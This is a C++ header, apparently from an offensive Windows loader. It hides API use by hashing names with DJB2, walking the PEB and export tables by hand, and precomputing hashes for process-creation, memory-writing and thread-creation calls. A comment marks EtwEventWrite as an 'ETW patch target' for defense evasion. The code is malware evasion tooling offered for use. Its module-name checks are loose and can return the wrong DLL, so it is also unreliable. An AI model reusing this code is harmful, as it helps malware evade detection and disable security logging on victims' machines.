#pragma once
#include <Windows.h>

// API Hashing: resolve APIs by DJB2 hash instead of GetProcAddress
// Removes dependency on GetProcAddress in IAT
// Walks ntdll/kernel32 EAT manually to find exports by hash
// No plaintext API name strings in binary

// LDR_DATA_TABLE_ENTRY for PEB walk
typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

// DJB2 hash function (runtime)
inline DWORD Djb2Hash(const char* str) {
    DWORD hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + (DWORD)(*str);
        str++;
    }
    return hash;
}

// Get ntdll base address from PEB (no GetModuleHandle needed)
inline HMODULE GetNtdllBase() {
    // Walk PEB Ldr list to find ntdll.dll
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    PPEB_LDR_DATA pLdr = pPeb->LoaderData;
    if (!pLdr) return nullptr;
    PLIST_ENTRY pListHead = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pListEntry = pListHead->Flink;

    while (pListEntry != pListHead) {
        PLDR_DATA_TABLE_ENTRY pLdrEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        
        // ntdll.dll is always the second module in load order (after main exe)
        // Check if DllBase is in System32 range and BaseDllName contains "ntdll"
        if (pLdrEntry->DllBase != nullptr && pLdrEntry->BaseDllName.pBuffer != nullptr) {
            wchar_t* name = pLdrEntry->BaseDllName.pBuffer;
            // Simple check: if name starts with 'n' or 'N' and is ~10 chars, likely ntdll
            if ((name[0] == L'n' || name[0] == L'N') && 
                pLdrEntry->BaseDllName.Length > 8 * sizeof(wchar_t)) {
                return (HMODULE)pLdrEntry->DllBase;
            }
        }
        pListEntry = pListEntry->Flink;
    }
    return nullptr;
}

// Get kernel32 base address from PEB
inline HMODULE GetKernel32Base() {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    PPEB_LDR_DATA pLdr = pPeb->LoaderData;
    if (!pLdr) return nullptr;
    PLIST_ENTRY pListHead = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pListEntry = pListHead->Flink;

    while (pListEntry != pListHead) {
        PLDR_DATA_TABLE_ENTRY pLdrEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        
        if (pLdrEntry->DllBase != nullptr && pLdrEntry->BaseDllName.pBuffer != nullptr) {
            wchar_t* name = pLdrEntry->BaseDllName.pBuffer;
            // kernel32.dll check: starts with 'k' or 'K'
            if ((name[0] == L'k' || name[0] == L'K') && 
                pLdrEntry->BaseDllName.Length > 10 * sizeof(wchar_t)) {
                return (HMODULE)pLdrEntry->DllBase;
            }
        }
        pListEntry = pListEntry->Flink;
    }
    return nullptr;
}

// Resolve API by hash from module EAT
inline PVOID GetProcByHash(HMODULE hModule, DWORD targetHash) {
    if (!hModule) return nullptr;

    BYTE* pBase = (BYTE*)hModule;
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBase;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBase + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + 
        pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* pAddressOfFunctions = (DWORD*)(pBase + pExportDir->AddressOfFunctions);
    DWORD* pAddressOfNames = (DWORD*)(pBase + pExportDir->AddressOfNames);
    WORD* pAddressOfNameOrdinals = (WORD*)(pBase + pExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        const char* pName = (const char*)(pBase + pAddressOfNames[i]);
        DWORD hash = Djb2Hash(pName);
        
        if (hash == targetHash) {
            WORD ordinal = pAddressOfNameOrdinals[i];
            PVOID pFunction = (PVOID)(pBase + pAddressOfFunctions[ordinal]);
            return pFunction;
        }
    }
    return nullptr;
}

// Pre-computed hashes for commonly used APIs
namespace ApiHash {
    const DWORD NtCreateSection = 0xD02E20D0;
    const DWORD NtCreateProcessEx = 0xA9E925B7;
    const DWORD NtQueryInformationProcess = 0xD034FC62;
    const DWORD NtCreateThreadEx = 0xCB0C2130;
    const DWORD RtlCreateProcessParametersEx = 0x19132CBB;
    const DWORD RtlInitUnicodeString = 0x29B75F89;
    const DWORD NtWriteVirtualMemory = 0x95F3A792;
    const DWORD NtAllocateVirtualMemory = 0x6793C34C;
    const DWORD NtSetInformationProcess = 0xBB7A48B8;
    const DWORD RtlImageNtHeader = 0xC63A2FA5;
    const DWORD NtReadVirtualMemory = 0xC24062E3;
    const DWORD EtwEventWrite = 0x24A8D022;  // B1: ETW patch target — T1562.006
}

// Helper macro to resolve API by hash
#define RESOLVE_API(module, apiName) \
    GetProcByHash(module, ApiHash::apiName)
